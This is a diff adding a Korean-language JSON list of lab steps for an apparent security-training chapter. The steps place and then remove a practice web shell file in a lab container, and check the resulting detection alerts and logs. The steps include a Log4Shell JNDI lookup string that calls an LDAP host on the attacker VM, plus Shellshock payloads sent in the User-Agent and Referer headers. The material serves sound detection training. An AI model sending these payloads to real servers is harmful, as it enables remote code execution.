@@ -1,1 +1,130 @@
-[]
+[
+  {
+    "type": "command",
+    "id": "C07-01",
+    "text": "docker exec -it kt66-web /bin/bash",
+    "why": "docker exec는 실행 중인 컨테이너에서 프로그램을 시작한다. -i는 입력 유지, -t는 터미널 할당, /bin/bash는 대화형 셸이다.",
+    "result": "이후 파일 명령은 kt66-web 안에서 실행한다.",
+    "where": "kt66 VM · 호스트 터미널"
+  },
+  {
+    "type": "command",
+    "id": "C07-02",
+    "text": "ls -ld /var/www/html/uploads",
+    "why": "ls는 파일 정보를 표시한다. -l은 상세 정보, -d는 디렉터리 자체의 정보를 표시한다.",
+    "result": "폴더가 있는지 확인한다. 없을 때만 다음 명령으로 만든다.",
+    "where": "kt66-web 컨테이너 안"
+  },
+  {
+    "type": "command",
+    "id": "C07-03",
+    "text": "mkdir -p /var/www/html/uploads",
+    "why": "mkdir는 디렉터리를 만든다. -p는 필요한 상위 경로도 만들고 기존 폴더는 유지한다.",
+    "result": "ls -ld /var/www/html/uploads로 생성 결과를 확인한다.",
+    "where": "kt66-web 컨테이너 안"
+  },
+  {
+    "type": "command",
+    "id": "C07-04",
+    "text": "ls -l /var/www/html/uploads/book07-shell.php",
+    "why": "쓸 파일의 존재 여부를 먼저 확인한다. book07-shell.php는 이 실습의 새 파일명이다.",
+    "result": "No such file or directory일 때 진행한다. 이미 있으면 내용을 확인하고 다른 실습 파일명을 정한다.",
+    "where": "kt66-web 컨테이너 안"
+  },
+  {
+    "type": "command",
+    "id": "C07-05",
+    "text": "vim /var/www/html/uploads/book07-shell.php",
+    "why": "Vim은 kt66-web에 설치된 텍스트 편집기이다. i를 눌러 입력 모드로 바꾸고 다음 코드를 입력한다. Esc → :wq → Enter로 저장하고 닫는다.",
+    "result": "PHP 코드를 파일로 저장한다. :wq에서 w는 저장, q는 종료이다. 저장하지 않고 취소하려면 Esc → :q! → Enter를 누른다.",
+    "where": "kt66-web 컨테이너 안"
+  },
+  {
+    "type": "command",
+    "id": "C07-06",
+    "text": "cat /var/www/html/uploads/book07-shell.php",
+    "why": "cat은 파일 내용을 출력한다. 저장한 내용과 위 코드를 대조한다.",
+    "result": "PHP 구문이 그대로 저장돼 있어야 한다. 달러 기호($)나 따옴표가 빠지지 않았는지 확인한다.",
+    "where": "kt66-web 컨테이너 안"
+  },
+  {
+    "type": "command",
+    "id": "C07-07",
+    "text": "exit",
+    "why": "현재 컨테이너 셸을 닫는다.",
+    "result": "kt66 호스트 터미널로 돌아간다.",
+    "where": "kt66-web 컨테이너 안"
+  },
+  {
+    "type": "command",
+    "id": "C07-08",
+    "text": "docker exec -it kt66-web /bin/bash",
+    "why": "-it로 대화형 셸에 접속한다.",
+    "result": "이후 삭제·확인은 kt66-web 안에서 한다.",
+    "where": "kt66 VM · 호스트 터미널"
+  },
+  {
+    "type": "command",
+    "id": "C07-09",
+    "text": "cat /var/www/html/uploads/book07-shell.php",
+    "why": "삭제할 파일의 내용을 먼저 읽는다.",
+    "result": "이번에 작성한 PHP 코드인지 확인한다.",
+    "where": "kt66-web 컨테이너 안"
+  },
+  {
+    "type": "command",
+    "id": "C07-10",
+    "text": "rm -i /var/www/html/uploads/book07-shell.php",
+    "why": "rm은 파일을 삭제하고 -i는 삭제 전에 확인을 묻는다.",
+    "result": "표시된 경로가 맞으면 y를 입력한다.",
+    "where": "kt66-web 컨테이너 안"
+  },
+  {
+    "type": "command",
+    "id": "C07-11",
+    "text": "ls -l /var/www/html/uploads/book07-shell.php",
+    "why": "삭제 후 같은 파일을 조회한다.",
+    "result": "No such file or directory이면 제거됐다.",
+    "where": "kt66-web 컨테이너 안"
+  },
+  {
+    "type": "command",
+    "id": "C07-12",
+    "text": "exit",
+    "why": "컨테이너 셸을 닫는다.",
+    "result": "호스트로 돌아간다.",
+    "where": "kt66-web 컨테이너 안"
+  },
+  {
+    "type": "command",
+    "id": "C07-13",
+    "text": "curl --version",
+    "why": "--version은 버전과 지원 기능을 표시한다. 기본 구문은 curl 옵션 URL이다.",
+    "result": "버전이 나오면 다음 요청을 수행할 수 있다. 없으면 1.12의 도구 설치를 먼저 마친다.",
+    "where": "공격자 VM · 터미널"
+  },
+  {
+    "type": "command",
+    "id": "C07-14",
+    "text": "curl -i --max-time 15 \\\n  -A '${jndi:ldap://192.168.0.202:1389/a}' \\\n  'http://dvwa.kt66.lab/?book07=lookup'",
+    "why": "User-Agent에 JNDI 조회 형태의 문자열을 넣는다. q 대신 book07 표식을 URL에 붙여 요청을 구분한다. IP는 자신의 공격자 VM 주소를 쓴다.",
+    "result": "상태·본문을 읽고 Q07-02에서 같은 요청을 찾는다. full_log에서 실제 헤더 값을 확인한다.",
+    "where": "공격자 VM · 터미널"
+  },
+  {
+    "type": "command",
+    "id": "C07-15",
+    "text": "curl -i --max-time 15 \\\n  -A '() { :; }; /bin/bash -c \"id\"' \\\n  http://juice.kt66.lab/cgi-bin/test.cgi",
+    "why": "-A로 User-Agent 값을 지정한다. 큰따옴표는 바깥 작은따옴표 안에 있으므로 헤더에 포함된 문자로 전달된다.",
+    "result": "HTTP 상태와 Q07-03의 경보를 대조한다. 명령 실행은 응답 본문·서버 기록으로 별도 확인한다.",
+    "where": "공격자 VM · 터미널"
+  },
+  {
+    "type": "command",
+    "id": "C07-16",
+    "text": "curl -i --max-time 15 \\\n  -H 'Referer: () { :; }; id' \\\n  http://dvwa.kt66.lab/cgi-bin/status",
+    "why": "-H는 Referer 헤더를 추가한다. 콜론 뒤는 헤더 값이다. 이번에는 함수 구문 뒤에 id를 붙인다.",
+    "result": "User-Agent 대신 Referer에 남은 구문과 응답을 원문에서 확인한다.",
+    "where": "공격자 VM · 터미널"
+  }
+]
